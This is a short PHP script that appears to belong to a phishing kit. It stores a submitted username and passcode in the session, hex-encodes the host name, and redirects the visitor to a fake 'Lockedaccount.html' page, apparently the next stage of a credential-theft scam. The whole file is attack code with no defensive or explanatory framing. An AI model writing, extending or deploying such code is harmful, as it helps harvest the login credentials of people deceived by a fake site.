<?php
session_start();
$_SESSION['username'] = $_POST['username'];
$_SESSION['passcode'] = $_POST['passcode'];
$host = bin2hex ($_SERVER['HTTP_HOST']);
$index="Lockedaccount.html?$host?$host?$host";

header("location: $index");
?>